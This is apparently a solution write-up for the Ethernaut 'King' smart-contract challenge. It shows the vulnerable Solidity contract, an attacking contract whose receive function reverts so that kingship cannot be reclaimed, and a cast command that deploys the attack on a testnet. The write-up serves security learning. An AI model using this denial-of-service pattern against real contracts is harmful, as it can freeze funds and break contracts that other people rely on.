---
title: "King"
tags: ["Receive"]
reference: https://ethernaut.openzeppelin.com/level/9
---

# Description

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

```sol
// SPDX-License-Identifier: MI
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

# Solution

1. Attack Idea

To become king, we have to execute `payable(king).transfer(msg.value)` first. So we may 

(1) let our controlled smart contract become king.
(2) require only the king(attacker address) can call the `receive` function of the smart contract so that the `King` contract cannot transfer ether to it.

2. Deploy `KingForever` smart contract

```sol
contract KingForever {
    address king;  

    constructor() {
        king = msg.sender;
    }

    function beKing(address _kingGame) external payable {
        _kingGame.call{value: msg.value}("");
    }

    receive() external payable {
        king.call{value: address(this).balance}("");
        require(msg.sender == king);
    }
}
```

3. call `beKing(address)`

```
cast send 0xEbDE76f16f11e1426972b9dA0AB3E18f240631a8 "beKing(address)" 0xd98558DEEE4ae2B3e6a3d4C0c2384c6aa16BE614 --valu
e 0.01ether --rpc-url $BASE_SEPOLIA_RPC --private-key
```
